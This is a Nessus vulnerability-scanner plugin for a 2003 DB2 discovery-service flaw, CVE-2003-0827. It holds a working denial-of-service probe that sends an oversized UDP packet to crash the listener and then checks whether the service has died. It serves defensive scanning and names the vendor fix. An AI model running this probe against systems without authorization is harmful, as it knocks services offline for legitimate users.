#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
# References:
# Date: Thu, 18 Sep 2003 20:17:36 -0400
# From: "Aaron C. Newman" <aaron@NEWMAN-FAMILY.COM>
# Subject: AppSecInc Security Alert: Denial of Service Vulnerability in DB2 Discovery Service
# To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
#

if(description)
{
 script_id(11896);
 script_version("$Revision: 1.9 $");
 script_cve_id("CVE-2003-0827");
 script_bugtraq_id(8653);
 name["english"] = "DB2 discovery service DOS";
 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote service is prone to a denial of service attack. 

Description :

It was possible to crash the DB2 UDP-based discovery listener on the
remote host by sending it a packet with more than 20 bytes.  An
unauthenticated attacker may use this attack to make this service
crash continuously, thereby denying service to legitimate users. 

See also :

http://www.securityfocus.com/archive/1/338234/30/0/threaded
http://www.nessus.org/u?8d0c33a1

Solution: 

Apply FixPack 10a or later.

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:N)";

 script_description(english:desc["english"]);
 
 summary["english"] = "A large UDP packet kills the remote service";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";

 script_family(english:family["english"], francais:family["francais"]);

 script_dependencies("db2_discovery_detect.nasl");
 script_require_udp_ports("Services/udp/db2_ds");
 exit(0);
}

#

include('global_settings.inc');
include("network_func.inc");


port = get_kb_item("Services/udp/db2_ds");
if (! get_udp_port_state(port)) exit(0);

# There is probably a clean way to do it and change this script to 
# an ACT_GATHER_INFO or ACT_MIXED...

if (! test_udp_port(port: port)) exit(0);

s = open_sock_udp(port);
if (! s) exit(0);
send(socket: s, data: crap(30));
close(s);

if (! test_udp_port(port: port)) security_note(port:port, proto:"udp");
